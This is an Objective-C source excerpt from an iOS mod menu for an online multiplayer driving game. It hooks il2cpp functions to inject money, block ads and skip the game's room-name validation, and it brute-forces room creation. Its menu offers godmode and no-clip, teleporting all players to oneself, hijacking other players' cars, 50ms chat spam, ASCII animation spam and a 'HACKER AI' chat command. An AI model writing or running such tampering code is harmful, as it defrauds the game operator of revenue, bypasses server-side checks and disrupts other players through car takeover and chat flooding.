- (void)emojiSpriteTest;
- (void)tapFlyPad;
- (void)buildFlyPad;
- (void)dpDown:(UIButton*)b;
- (void)dpUp:(UIButton*)b;
- (void)tapAutoGreet;
- (void)editGreet;
- (void)joinRoomByName;
- (void)pickRoomsServerHide;
- (void)present:(UIAlertController*)ac;
- (void)askAiDirect;
@end

static int g_bruteForceIdx = 0;
static bool isBruteForceActive = false;
static NSArray* g_bruteForceNames = nil;
static void (*o_onCreateFail)(void*, short, void*) = NULL;
static void h_onCreateFail(void* self, short code, void* msg) {
    @try { FLog([NSString stringWithFormat:@"ODA KURMA HATASI: kod=%d mesaj=%@", (int)code, readStr(msg)]); } @catch (...) {}
    // BRUTE FORCE: Basarisiz olunca otomatik sonraki teknikle dene
    if (isBruteForceActive && g_bruteForceNames && g_bruteForceIdx < (int)g_bruteForceNames.count) {
        NSString *nextName = g_bruteForceNames[g_bruteForceIdx++];
        strncpy(customRoomName, nextName.UTF8String, sizeof(customRoomName)-1);
        customRoomName[sizeof(customRoomName)-1]='\0';
        FLog([NSString stringWithFormat:@"BRUTE FORCE: Teknik %d/%d deneniyor -> %@", g_bruteForceIdx, (int)g_bruteForceNames.count, nextName]);
        // 0.3sn bekle ve tekrar dene
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [[FEW1NMenu shared] createOneRoom];
        });
        return;  // Orijinal hatayi cagirma - brute force devam ediyor
    }
    if (isBruteForceActive) {
        isBruteForceActive = false;
        FLog(@"BRUTE FORCE: Tum teknikler denendi, basarisiz.");
    }
    if (o_onCreateFail) o_onCreateFail(self, code, msg);
}
static void (*o_onJoinFail)(void*, short, void*) = NULL;
static void h_onJoinFail(void* self, short code, void* msg) {
    @try { FLog([NSString stringWithFormat:@"ODA GIRIS HATASI: kod=%d mesaj=%@", (int)code, readStr(msg)]); } @catch (...) {}
    if (o_onJoinFail) o_onJoinFail(self, code, msg);
}

// ===== "ODA OLUSTUR" butonu: yazdigin rich text ismi DOGRUDAN pn_createRoom ile kur =====
// Oyunun kendi CreateRoomButton'u rich text ismi reddediyordu; biz dogrulamayi atliyoruz.
static void (*o_createRoomBtn)(void*) = NULL;
static void h_createRoomBtn(void* self) {
    fCreateBtn++;
    @try {
        void* nameInput = *(void**)((uintptr_t)self + 0x48);   // roomNameInput
        NSString *typed = (nameInput && tmp_get_text) ? readStr(tmp_get_text(nameInput)) : @"";
        // SADECE rich text isimlerde bypass yap (normal odalar oyunun akisini kullansin -> harita korunur)
        BOOL isRich = ([typed rangeOfString:@"<"].location != NSNotFound);
        if (isRich && typed.length > 0 && pn_createRoom && i_object_new && g_roomOptionsClass) {
            static int gc = 0; gc++;
            NSString *zwsp = [NSString stringWithFormat:@"%C", (unichar)0x200B];
            NSMutableString *uniq = [NSMutableString stringWithString:typed];
            int reps = (gc % 400) + 1;
            for (int i = 0; i < reps; i++) [uniq appendString:zwsp];
            void* ns = mkStr(uniq);
            void* opts = i_object_new(g_roomOptionsClass);
            if (ns && opts) {
                *(bool*)((uintptr_t)opts + 0x10) = true;
                *(bool*)((uintptr_t)opts + 0x11) = true;
                *(int*) ((uintptr_t)opts + 0x14) = roomMaxPlayers;   // MAX oyuncu (oyun 10 sinirini as)
                *(int*) ((uintptr_t)opts + 0x1C) = roomSpamTTL;
                pn_createRoom(ns, opts, NULL, NULL);
                FLog(@"Oda kuruldu (direkt pn_createRoom, dogrulama atlandi)");
                return;   // orijinali CAGIRMA -> reddi atla
            }
        }
    } @catch (...) {}
    if (o_createRoomBtn) o_createRoomBtn(self);   // yedek: normal akis
}

// ===== MONEY =====
static void (*o_addMoney)(void*, int) = NULL;
static void h_addMoney(void* self, int amount) {
    if (isAutoMoneyEnabled && amount > 0) amount = customMoneyAmount;
    if (o_addMoney) o_addMoney(self, amount);
}

// ===== CAS IL2CPP REKLAM HOOKS (CANLI REKLAM BOZUCU) =====
static void (*o_casShowAd)(void*, int, void*) = NULL;
static void h_casShowAd(void* self, int adType, void* method) {
    if (isAdBlockEnabled) { FLog(@"\U0001F6AB il2cpp CAS ShowAd ENGELLENDI"); return; }
    if (o_casShowAd) o_casShowAd(self, adType, method);
}

static void (*o_casClientShowAd)(void*, int, void*, void*) = NULL;
static void h_casClientShowAd(void* self, int adType, void* placement, void* method) {
    if (isAdBlockEnabled) { FLog(@"\U0001F6AB il2cpp CAS Client ShowAd ENGELLENDI"); return; }
    if (o_casClientShowAd) o_casClientShowAd(self, adType, placement, method);
}

static bool (*o_casIsReadyAd)(void*, int, void*) = NULL;
static bool h_casIsReadyAd(void* self, int adType, void* method) {
    if (isAdBlockEnabled) return false;
    return o_casIsReadyAd ? o_casIsReadyAd(self, adType, method) : false;
}

static void (*o_casExternsShowAd)(intptr_t, int, void*, void*) = NULL;
static void h_casExternsShowAd(intptr_t managerRef, int type, void* placement, void* method) {
    if (isAdBlockEnabled) { FLog(@"\U0001F6AB il2cpp CAS Externs ShowAd ENGELLENDI"); return; }
    if (o_casExternsShowAd) o_casExternsShowAd(managerRef, type, placement, method);
}

// OYUNUN KENDI CASAd WRAPPER HOOKLARI (Otomatik reklam engelleme)
static void (*o_casAdCount)(void*, void*) = NULL;
static void h_casAdCount(void* self, void* method) {
    if (isAdBlockEnabled) return; // Otomatik reklam sayacini durdur
    if (o_casAdCount) o_casAdCount(self, method);
}

static void (*o_casInterGin)(void*, void*) = NULL;
static void h_casInterGin(void* self, void* method) {
    if (isAdBlockEnabled) return;
    if (o_casInterGin) o_casInterGin(self, method);
}

static void (*o_casInterGio)(void*, void*) = NULL;
static void h_casInterGio(void* self, void* method) {
    if (isAdBlockEnabled) return;
    if (o_casInterGio) o_casInterGio(self, method);
}

static void (*o_casRewardPresent)(void*, void*) = NULL;
static void h_casRewardPresent(void* self, void* method) {
    if (isAdBlockEnabled) { FLog(@"\U0001F6AB Rewarded reklam engellendi"); return; }
    if (o_casRewardPresent) o_casRewardPresent(self, method);
}

// =============================================================
//  UI
// =============================================================
// ==== BEYAZ ARKA PLAN / BUZ MAVISI NEON TEMA ====
#define C_BG     [UIColor colorWithRed:0.97 green:0.99 blue:1.0 alpha:0.97]   // beyaz panel
#define C_CARD   [UIColor colorWithRed:0.20 green:0.55 blue:0.75 alpha:0.07]  // hafif buz karti
#define C_ON     [UIColor colorWithRed:0.0 green:0.55 blue:0.85 alpha:1.0]    // canli buz mavisi (acik)
#define C_OFF    [UIColor colorWithRed:0.70 green:0.76 blue:0.82 alpha:1.0]   // gri (kapali)
#define C_RED    [UIColor colorWithRed:0.90 green:0.20 blue:0.35 alpha:1.0]
#define C_ACCENT [UIColor colorWithRed:0.0 green:0.60 blue:0.90 alpha:1.0]    // buz mavisi vurgu
#define C_GOLD   [UIColor colorWithRed:0.0 green:0.45 blue:0.70 alpha:1.0]    // koyu buz mavisi
#define C_CYAN   [UIColor colorWithRed:0.10 green:0.62 blue:0.92 alpha:1.0]
#define C_TEXT   [UIColor colorWithRed:0.06 green:0.12 blue:0.20 alpha:1.0]   // koyu lacivert metin
#define C_SUB    [UIColor colorWithRed:0.30 green:0.42 blue:0.52 alpha:0.85]  // gri-mavi alt metin

// =============================================================
//  GIF -> ASCII  (cihaz uzerinde, harici API YOK - ImageIO + CoreGraphics)
//  GIF karelerini cozup her pikselin parlakligini ASCII karaktere cevirir.
// =============================================================
static NSMutableArray *g_gifFrames = nil;   // GIF'ten cevrilen ASCII kareler
static bool     g_gifColored = false;       // Acik=gokkusagi renkli oynat
static NSTimer *g_gifTimer = nil;
static int      g_gifIdx = 0;
static int      g_gifCols = 24;             // ASCII genislik (olcu): 16=kucuk 24=orta 32=buyuk 40=dev

// ================= FAVORILER (hizli erisim paneli) =================
static NSMutableArray *g_favorites = nil;   // favori ozellik anahtarlari (kalici)
static void loadFavorites(void) {
    if (g_favorites) return;
    NSArray *a = [[NSUserDefaults standardUserDefaults] arrayForKey:@"few1n_favorites"];
    g_favorites = a ? [a mutableCopy] : [NSMutableArray array];
}
static void saveFavorites(void) {
    if (g_favorites) {
        [[NSUserDefaults standardUserDefaults] setObject:g_favorites forKey:@"few1n_favorites"];
        [[NSUserDefaults standardUserDefaults] synchronize];
    }
}

// Tek CGImage -> ASCII metin (cols genislik; satir sayisi en-boy oranindan)
static NSString* few1n_cgimageToAscii(CGImageRef img, int cols) {
    if (!img || cols < 4) return nil;
    size_t iw = CGImageGetWidth(img);
    size_t ih = CGImageGetHeight(img);
    if (iw == 0 || ih == 0) return nil;
    int rows = (int)((double)cols * ((double)ih / (double)iw) * 0.5);  // 0.5: karakter ~2x uzun
    if (rows < 2)  rows = 2;
    if (rows > 12) rows = 12;                                          // chat uzunluk siniri icin
    size_t bpp = 4;
    size_t bpr = (size_t)cols * bpp;
    unsigned char *buf = (unsigned char*)calloc((size_t)rows * bpr, 1);
    if (!buf) return nil;
    CGColorSpaceRef csp = CGColorSpaceCreateDeviceRGB();
    CGContextRef ctx = CGBitmapContextCreate(buf, (size_t)cols, (size_t)rows, 8, bpr, csp,
                            (CGBitmapInfo)(kCGImageAlphaPremultipliedLast | kCGBitmapByteOrder32Big));
    CGColorSpaceRelease(csp);
    if (!ctx) { free(buf); return nil; }
    CGContextSetInterpolationQuality(ctx, kCGInterpolationHigh);
    CGContextDrawImage(ctx, CGRectMake(0, 0, cols, rows), img);
    CGContextRelease(ctx);
    const char *ramp = " .:-=+*#%@";     // koyu -> acik (10 karakter)
    int maxIdx = 9;
    NSMutableString *out = [NSMutableString string];
    for (int yy = 0; yy < rows; yy++) {
        int srcY = rows - 1 - yy;        // CGBitmap alt-sol orijin -> dikey cevir
        for (int xx = 0; xx < cols; xx++) {
            unsigned char *px = buf + (size_t)srcY * bpr + (size_t)xx * bpp;
            int r = px[0], g = px[1], b = px[2];
            int lum = (r * 30 + g * 59 + b * 11) / 100;   // 0..255
            // kontrast artir -> resim net ASCII olur (gri bulamac olmasin)
            int cl = ((lum - 128) * 165) / 100 + 128;
            if (cl < 0) cl = 0;
            if (cl > 255) cl = 255;
            int idx = cl * maxIdx / 255;
            if (idx < 0) idx = 0;
            if (idx > maxIdx) idx = maxIdx;
            [out appendFormat:@"%c", ramp[idx]];
        }
        if (yy < rows - 1) [out appendString:@"\n"];
    }
    free(buf);
    return out;
}

// GIF verisi -> ASCII kare dizisi
static NSArray* few1n_gifDataToAscii(NSData *data, int maxFrames, int cols) {
    if (!data || data.length == 0) return nil;
    CGImageSourceRef src = CGImageSourceCreateWithData((__bridge CFDataRef)data, NULL);
    if (!src) return nil;
    size_t count = CGImageSourceGetCount(src);
    if (count == 0) { CFRelease(src); return nil; }
    NSMutableArray *out = [NSMutableArray array];
    int step = 1;
    if ((int)count > maxFrames) step = (int)count / maxFrames;
    if (step < 1) step = 1;
    for (size_t i = 0; i < count; i += (size_t)step) {
        CGImageRef img = CGImageSourceCreateImageAtIndex(src, i, NULL);
        if (img) {
            NSString *frame = few1n_cgimageToAscii(img, cols);
            CGImageRelease(img);
            if (frame.length > 0) [out addObject:frame];
        }
        if ((int)out.count >= maxFrames) break;
    }
    CFRelease(src);
    return out;
}

// En ustteki view controller (picker sunmak icin)
static UIViewController* few1n_topVC(void) {
    UIWindow *win = nil;
    NSArray *scenes = [[[UIApplication sharedApplication] connectedScenes] allObjects];
    for (id sc in scenes) {
        if ([sc isKindOfClass:[UIWindowScene class]]) {
            for (UIWindow *w in ((UIWindowScene*)sc).windows) {
                if (w.isKeyWindow) { win = w; break; }
            }
        }
        if (win) break;
    }
    if (!win) {
        NSArray *ws = [[UIApplication sharedApplication] windows];
        for (UIWindow *w in ws) { if (w.isKeyWindow) { win = w; break; } }
        if (!win && ws.count > 0) win = ws.firstObject;
    }
    UIViewController *vc = win.rootViewController;
    while (vc.presentedViewController) vc = vc.presentedViewController;
    return vc;
}

@implementation FEW1NMenu

+ (instancetype)shared {
    static FEW1NMenu *inst = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ inst = [[self alloc] init]; });
    return inst;
}

- (void)build {
    UIWindow *w = getKeyWindow();
    if (!w) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
            if (!self.panel) [self build];
        });
        return;
    }
    if (self.panel) return;
    self.toggleViews = [NSMutableDictionary new];
    self.speedBtns = [NSMutableDictionary new];

    // FAB
    self.fab = [UIButton buttonWithType:UIButtonTypeCustom];
    self.fab.frame = CGRectMake(16, 100, 56, 56);
    self.fab.layer.cornerRadius = 28;
    self.fab.clipsToBounds = NO;
    UIView *pulse = [[UIView alloc] initWithFrame:self.fab.bounds];
    pulse.layer.cornerRadius = 28; pulse.backgroundColor = C_CYAN;
    pulse.alpha = 0.4; pulse.userInteractionEnabled = NO;
    [self.fab addSubview:pulse];
    [UIView animateWithDuration:1.8 delay:0 options:UIViewAnimationOptionRepeat|UIViewAnimationOptionCurveEaseOut animations:^{
        pulse.transform = CGAffineTransformMakeScale(1.6,1.6); pulse.alpha = 0.0;
    } completion:nil];
    CAGradientLayer *fg = [CAGradientLayer layer];
    fg.frame = self.fab.bounds; fg.cornerRadius = 28;
    fg.colors = @[(id)C_CYAN.CGColor, (id)C_ACCENT.CGColor];
    fg.startPoint = CGPointMake(0,0); fg.endPoint = CGPointMake(1,1);
    [self.fab.layer insertSublayer:fg atIndex:0];
    self.fab.layer.shadowColor = C_CYAN.CGColor;
    self.fab.layer.shadowRadius = 15; self.fab.layer.shadowOpacity = 0.8;
    self.fab.layer.shadowOffset = CGSizeMake(0,0);
    UILabel *fl = [[UILabel alloc] initWithFrame:self.fab.bounds];
    fl.text = @"F1"; fl.textColor = [UIColor whiteColor];
    fl.textAlignment = NSTextAlignmentCenter;
    fl.font = [UIFont systemFontOfSize:21 weight:UIFontWeightBlack];
    fl.layer.shadowColor = [UIColor blackColor].CGColor;
    fl.layer.shadowRadius = 2; fl.layer.shadowOpacity = 0.25; fl.layer.shadowOffset = CGSizeMake(0,1);
    [self.fab addSubview:fl];
    [self.fab addTarget:self action:@selector(toggle) forControlEvents:UIControlEventTouchUpInside];
    [self.fab addGestureRecognizer:[[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(drag:)]];
    [w addSubview:self.fab];

    // PANEL - ekrana sigacak sekilde dinamik yukseklik (landscape'te tasmasin)
    CGFloat pw = 310;
    CGFloat ph = MIN(600.0, w.bounds.size.height - 30.0);
    if (ph < 260) ph = 260;
    self.panel = [[UIView alloc] initWithFrame:CGRectMake((w.bounds.size.width-pw)/2, (w.bounds.size.height-ph)/2, pw, ph)];
    self.panel.backgroundColor = C_BG;
    self.panel.layer.cornerRadius = 28;
    self.panel.layer.borderWidth = 1.5;
    self.panel.layer.borderColor = [UIColor colorWithRed:0.0 green:0.60 blue:0.90 alpha:0.35].CGColor;
    self.panel.layer.shadowColor = C_CYAN.CGColor;
    self.panel.layer.shadowRadius = 25; self.panel.layer.shadowOpacity = 0.4;
    self.panel.layer.shadowOffset = CGSizeMake(0,0);
    self.panel.clipsToBounds = YES;
    self.panel.hidden = YES; self.panel.alpha = 0;
    self.panel.transform = CGAffineTransformMakeScale(0.85, 0.85);
    UIVisualEffectView *blurV = [[UIVisualEffectView alloc] initWithEffect:[UIBlurEffect effectWithStyle:UIBlurEffectStyleExtraLight]];
    blurV.frame = self.panel.bounds;
    blurV.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    [self.panel insertSubview:blurV atIndex:0];
    [self.panel addGestureRecognizer:[[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(drag:)]];

    // HEADER - canli mavi baslik bandi (beyaz metin uzerinde parlar)
    UIView *header = [[UIView alloc] initWithFrame:CGRectMake(0,0,pw,64)];
    header.backgroundColor = [UIColor colorWithRed:0.0 green:0.48 blue:0.85 alpha:1.0];
    CAGradientLayer *hgrad = [CAGradientLayer layer];
    hgrad.frame = CGRectMake(0,0,pw,64);
    hgrad.colors = @[(id)[UIColor colorWithRed:0.05 green:0.62 blue:0.96 alpha:1.0].CGColor,
                     (id)[UIColor colorWithRed:0.0 green:0.40 blue:0.80 alpha:1.0].CGColor];
    hgrad.startPoint = CGPointMake(0,0); hgrad.endPoint = CGPointMake(1,1);
    [header.layer insertSublayer:hgrad atIndex:0];
    // parlak nokta rozeti
    UILabel *dotIcon = [[UILabel alloc] initWithFrame:CGRectMake(16,18,22,26)];
    dotIcon.text = @"\U0001F3CE"; dotIcon.font = [UIFont systemFontOfSize:18];
    [header addSubview:dotIcon];
    UILabel *title = [[UILabel alloc] initWithFrame:CGRectMake(42,12,pw-90,26)];
    title.text = @"FEW1N MOD MENU"; title.textColor = [UIColor whiteColor];
    title.font = [UIFont systemFontOfSize:17 weight:UIFontWeightBlack];
    [header addSubview:title];
    UILabel *ver = [[UILabel alloc] initWithFrame:CGRectMake(42,37,pw-90,16)];
    ver.text = [NSString stringWithFormat:@"v114.8  •  Base 0x%lX", (unsigned long)global_base];
    ver.textColor = [UIColor colorWithWhite:1 alpha:0.82];
    ver.font = [UIFont fontWithName:@"Menlo-Bold" size:8] ?: [UIFont systemFontOfSize:8 weight:UIFontWeightBold];
    [header addSubview:ver];
    UIButton *cls = [UIButton buttonWithType:UIButtonTypeSystem];
    cls.frame = CGRectMake(pw-48,14,36,36);
    cls.backgroundColor = [UIColor colorWithWhite:1 alpha:0.18];
    cls.layer.cornerRadius = 18;
    [cls setTitle:@"✕" forState:UIControlStateNormal];
    [cls setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    cls.titleLabel.font = [UIFont systemFontOfSize:17 weight:UIFontWeightSemibold];
    [cls addTarget:self action:@selector(toggle) forControlEvents:UIControlEventTouchUpInside];
    [header addSubview:cls];
    [self.panel addSubview:header];

    // SCROLL
    self.scrollView = [[UIScrollView alloc] initWithFrame:CGRectMake(0,64,pw,ph-64)];
    self.scrollView.showsVerticalScrollIndicator = NO;
    [self.panel addSubview:self.scrollView];
    self.contentView = [[UIView alloc] initWithFrame:CGRectMake(0,0,pw,0)];
    [self.scrollView addSubview:self.contentView];

    g_secBuildIdx = -1;   // accordion: bolum sayacini sifirla (her build basinda)
    CGFloat y = 12;

    y = [self header:@"\U0001F6AB  REKLAM BOZUCU" atY:y];
    y = [self toggle:@"\U0001F6AB  Reklam Engelle" sub:@"Tum reklamlari engeller (AdMob/AppLovin/CAS/Unity)" key:@"adblock" atY:y action:@selector(tapAdBlock)];

    y = [self header:@"⚡  HIZ (timeScale)" atY:y];
    {
        // YENI: slider 0.1x - 10x (0.1 adim); butonlar kaldirildi
        UIView *sr = [[UIView alloc] initWithFrame:CGRectMake(12,y,pw-24,66)];
        sr.backgroundColor = [UIColor colorWithRed:0.93 green:0.96 blue:0.99 alpha:1.0];
        sr.layer.cornerRadius = 12;
        sr.layer.borderWidth = 1.0;
        sr.layer.borderColor = [UIColor colorWithRed:0.0 green:0.48 blue:0.85 alpha:0.12].CGColor;
        UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(12,4,pw-48-40,18)];
        lbl.tag = 991; lbl.textColor = C_TEXT;
        lbl.font = [UIFont systemFontOfSize:12 weight:UIFontWeightSemibold];
        lbl.text = [NSString stringWithFormat:@"Hiz Carpani: %.1fx", speedMult];
        [sr addSubview:lbl];
        UISlider *sl = [[UISlider alloc] initWithFrame:CGRectMake(12,26,pw-48,32)];
        sl.minimumValue = 0.1f; sl.maximumValue = 10.0f;
        sl.value = speedMult; sl.tag = 992;
        sl.minimumTrackTintColor = C_ON;
        sl.maximumTrackTintColor = C_OFF;
        [sl addTarget:self action:@selector(speedSliderChanged:) forControlEvents:UIControlEventValueChanged];
        [sr addSubview:sl];
        UIButton *rst = [UIButton buttonWithType:UIButtonTypeSystem];
        rst.frame = CGRectMake(pw-24-38,4,32,18);
        [rst setTitle:@"1x" forState:UIControlStateNormal];
        [rst setTitleColor:C_ACCENT forState:UIControlStateNormal];
        rst.titleLabel.font = [UIFont systemFontOfSize:11 weight:UIFontWeightBold];
        [rst addTarget:self action:@selector(speedReset) forControlEvents:UIControlEventTouchUpInside];
        [sr addSubview:rst];
        [self.contentView addSubview:sr];
        objc_setAssociatedObject(sr, "adv", @(74.0), OBJC_ASSOCIATION_RETAIN);
        y += 74;
    }
    UILabel *hint = [[UILabel alloc] initWithFrame:CGRectMake(16,y,pw-32,16)];
    hint.text = @"0.1x-10x aralik | Online icin 1.5x-2x onerilir";
    hint.textColor = C_SUB; hint.font = [UIFont systemFontOfSize:9];
    [self.contentView addSubview:hint];
    objc_setAssociatedObject(hint, "adv", @(22.0), OBJC_ASSOCIATION_RETAIN);
    y += 22;

    y = [self header:@"\U0001F3CE  ARAC" atY:y];
    y = [self toggle:@"🧊  Drift Modu (Kusursuz Kayma)" sub:@"il2cpp fizik ile yan kayma koruması" key:@"drift" atY:y action:@selector(tapDrift)];
    y = [self toggle:@"🚗  Hız Sabitleyici (Cruise Control)" sub:@"Gaza basmadan belirlenen hızda git" key:@"cruise" atY:y action:@selector(tapCruise)];
    y = [self actionRow:@"✏️  Sabit Hız Ayarla (km/h)" color:C_CYAN atY:y action:@selector(editCruiseSpeed)];
    y = [self toggle:@"\U0001F681  Ucus (Havada Surus)" sub:@"Gaz=ileri it, direksiyon=havada don" key:@"fly" atY:y action:@selector(tapFly)];
    y = [self toggle:@"\U0001F6E9  Ucusta Otomatik Gaz" sub:@"Otomatik ileri gider -> parmak sadece direksiyonda (gaz+don sorunu biter)" key:@"flyauto" atY:y action:@selector(tapFlyAuto)];
    y = [self toggle:@"\U0001F579  Ucus Kumandasi (D-pad)" sub:@"Ekranda ok tuslari -> mod'un butonlariyla uc (gaz+don ayni anda)" key:@"flypad" atY:y action:@selector(tapFlyPad)];
    y = [self toggle:@"\U0001FAB6  Dusuk Yercekimi" sub:@"Dusus yavas, floaty" key:@"lowgrav" atY:y action:@selector(tapLowGrav)];
    y = [self toggle:@"\U0001F319  Anti-Gravity (Ay modu)" sub:@"Yercekimi kapali, suzul (asili kal)" key:@"antigrav" atY:y action:@selector(tapAntiGrav)];
    y = [self toggle:@"\U0001F47B  No-Clip (Araclardan Gec)" sub:@"Trafikten/duvardan gec - godmode gibi ama fiziksel gecis" key:@"noclip" atY:y action:@selector(tapNoClip)];
    y = [self toggle:@"\U0001F6E1  GODMODE (Kaza Yapma)" sub:@"Trafige carpsan bile olmezsin" key:@"godmode" atY:y action:@selector(tapGodmode)];
    y = [self toggle:@"\U0001F4A1  Hizli Selektor (far cakma)" sub:@"On farlari hizli ac/kapat (RCCP)" key:@"selektor" atY:y action:@selector(tapSelektor)];
    y = [self toggle:@"🔥  Pop & Bangs (Egzoz Alev Patlatma)" sub:@"Vites veya gaz birakmada egzoz alev/patlama efekti" key:@"popbangs" atY:y action:@selector(tapPopBangs)];
    y = [self toggle:@"🔊  Otomatik Havali Korna" sub:@"Ritmik havalı korna calar (herkese duyulur)" key:@"autohorn" atY:y action:@selector(tapAutoHorn)];
    y = [self toggle:@"🔥  Surekli Sari Balata" sub:@"Fren yapmadan sari glow: dob(1e9) + kalici esik birlikte" key:@"brakeglow" atY:y action:@selector(tapBrakeGlow)];
    y = [self toggle:@"🧪  Balata Testi: Anlik Sicaklik" sub:@"Yalniz dob(1e9): minVisibleTemperature yazilmaz" key:@"brakeglowdob" atY:y action:@selector(tapBrakeGlowDob)];
    y = [self toggle:@"🧪  Balata Testi: Kalici Esik" sub:@"Yalniz minVisibleTemperature yazilir; dob cagrilmaz" key:@"brakeglowmin" atY:y action:@selector(tapBrakeGlowMinTemp)];
    y = [self toggle:@"🛡️  Hasar Yok" sub:@"Arac hasar almaz — RCCP_Damage.Update hook ile" key:@"nodamage" atY:y action:@selector(tapNoDamage)];

    // Gizli il2cpp özellikleri (field API - versiyon-dayanikli)
    y = [self toggle:@"💨  SONSUZ NOS" sub:@"RCCP_Nos.amount = 100 sürekli" key:@"infnos" atY:y action:@selector(tapInfNos)];
    y = [self toggle:@"⛽  SONSUZ YAKIT" sub:@"RCCP_FuelTank fill=999 + consumption=0" key:@"inffuel" atY:y action:@selector(tapInfFuel)];
    y = [self toggle:@"🚀  MAX RPM (Turbo)" sub:@"RCCP_Engine override + engineRPM=9000" key:@"maxrpm" atY:y action:@selector(tapMaxRpm)];
    y = [self toggle:@"🛡️  HASAR YOK V2 (il2cpp)" sub:@"RCCP_Damage maximumDamage=0 + deformMult=0" key:@"nodamagev2" atY:y action:@selector(tapNoDamageV2)];
    y = [self toggle:@"🔥  Motor Ölmez" sub:@"RCCP_Engine.engineRunning = true" key:@"immortalengine" atY:y action:@selector(tapImmortalEngine)];
    y = [self toggle:@"🚗  Trafik Dursun" sub:@"HR_TrafficCar.maximumSpeed = 0" key:@"notraffic" atY:y action:@selector(tapNoTraffic)];
    // v102: 6 yeni ozellik
    y = [self toggle:@"✨  Emissive Parlak Boya" sub:@"Aracın materyallerini HDR sarı-turuncu parlak yapar" key:@"emissive" atY:y action:@selector(tapEmissivePaint)];
    y = [self toggle:@"🔥  Egzoz Alev Sürekli" sub:@"RCCP_Exhaust.flameOnCutOff=true" key:@"exhaustflame" atY:y action:@selector(tapExhaustFlame)];
    y = [self toggle:@"📺  Vidyo İsim Modu" sub:@"Rich text oyuncu isimlerini vidyo yap" key:@"vidyonames" atY:y action:@selector(tapVidyoNames)];
    y = [self actionRow:@"🔧  Parça Sök & Fırlat (kapı/spoyler koparsın)" color:C_RED atY:y action:@selector(tapDetachParts)];
    y = [self actionRow:@"🚀  Herkesi Sana Teleport Et" color:C_ON atY:y action:@selector(tapTeleportAllToMe)];
    y = [self actionRow:@"🎮  Yabancı Aracı Ele Geçir (isMine=true)" color:C_GOLD atY:y action:@selector(tapHijackCar)];
    y = [self actionRow:@"✏️  Selektor Hizi Ayarla" color:C_CYAN atY:y action:@selector(editSelektorSpeed)];
    y = [self actionRow:@"\U0001F53C  ZIPLA (bas)" color:C_ON atY:y action:@selector(jumpTap)];
    y = [self actionRow:@"\U0001F680  Hiz Patlamasi (boost)" color:C_ON atY:y action:@selector(boostTap)];
    y = [self actionRow:@"\U0001F9CA  Araci Dondur (anlik dur)" color:C_CYAN atY:y action:@selector(freezeTap)];
    y = [self actionRow:@"\U0001F53C  Yukari Isinlan (takildinca)" color:C_CYAN atY:y action:@selector(teleportUp)];
    y = [self actionRow:@"➡️  Ileri Isinlan (+50)" color:C_CYAN atY:y action:@selector(teleportForward)];
    y = [self actionRow:@"\U0001F4CD  Konum Kaydet" color:C_GOLD atY:y action:@selector(saveTeleportPos)];
    y = [self actionRow:@"\U0001F680  Kayitli Konuma Isinlan" color:C_GOLD atY:y action:@selector(teleportSaved)];
    y = [self actionRow:@"\U0001F3AF  Oyuncuya Isinlan (yanina git)" color:C_ON atY:y action:@selector(teleportToPlayer)];
    y = [self actionRow:@"\U0001F9F2  Oyuncuyu Yanima Cek (RPC Isinla)" color:C_ON atY:y action:@selector(bringPlayerToMe)];

    y = [self header:@"\U0001F4AC  CHAT" atY:y];
    y = [self actionRow:@"💬  AI'ye Dogrudan Soru Sor (Pencereden)" color:C_GOLD atY:y action:@selector(askAiDirect)];
    y = [self actionRow:@"🤖  AI Bot Kurulumu (Grok / Groq)" color:C_ON atY:y action:@selector(editAiApiKey)];
    y = [self toggle:@"💬  AI Sohbet Modu" sub:@"/ai olmadan sadece 'AI', 'bot' veya 'Grok' hitaplarina cevap verir" key:@"aichat" atY:y action:@selector(tapAiChatMode)];
    y = [self actionRow:@"🎨  AI Cevap Renkleri Sec (isim + cevap)" color:C_GOLD atY:y action:@selector(pickAiColors)];
    y = [self actionRow:@"🔓  HACKER AI: chat'e /hack <istek> yaz" color:C_RED atY:y action:@selector(showHackerAiInfo)];
    y = [self toggle:@"\U0001F4E2  Chat Spam" sub:@"50ms araligla mesaj" key:@"chatspam" atY:y action:@selector(tapChatSpam)];
    y = [self actionRow:@"✏️  Spam Yazisini Duzenle" color:C_CYAN atY:y action:@selector(editSpam)];
    y = [self actionRow:@"\U0001F3A8  Spam/Chat Rengi Sec (ozel hex)" color:C_CYAN atY:y action:@selector(pickSpamColor)];
    y = [self actionRow:@"\U0001F58D  Renkli Mesaj Gonder (istedigin renkte)" color:C_ON atY:y action:@selector(sendColoredChat)];
    {
        UIView *ssrow = [[UIView alloc] initWithFrame:CGRectMake(12,y,pw-24,44)];
        ssrow.backgroundColor = C_CARD; ssrow.layer.cornerRadius = 12;
        UIButton *ssb = [UIButton buttonWithType:UIButtonTypeSystem];
        ssb.frame = CGRectMake(0,0,pw-24,44);
        NSArray *nm = @[@"Duz", @"Cerceveli", @"Semboller", @"Renkli", @"Gokkusagi", @"Buyuk+Renk", @"Cerceve+Renk"];
        [ssb setTitle:[NSString stringWithFormat:@"\U0001F3AD Spam Stili: %@", nm[spamStyle % 7]] forState:UIControlStateNormal];
        [ssb setTitleColor:C_ACCENT forState:UIControlStateNormal];
        ssb.titleLabel.font = [UIFont systemFontOfSize:13 weight:UIFontWeightSemibold];
        [ssb addTarget:self action:@selector(pickSpamStyle:) forControlEvents:UIControlEventTouchUpInside];
        [ssrow addSubview:ssb];
        [self.contentView addSubview:ssrow];
        y += 52;
    }
    y = [self toggle:@"\U0001F3AC  ASCII Animasyon Spam" sub:@"Kare kare animasyon chate" key:@"asciianim" atY:y action:@selector(tapAsciiAnim)];
    {
        UIView *arow = [[UIView alloc] initWithFrame:CGRectMake(12,y,pw-24,44)];
        arow.backgroundColor = C_CARD; arow.layer.cornerRadius = 12;
        UIButton *ab = [UIButton buttonWithType:UIButtonTypeSystem];
        ab.frame = CGRectMake(0,0,pw-24,44);
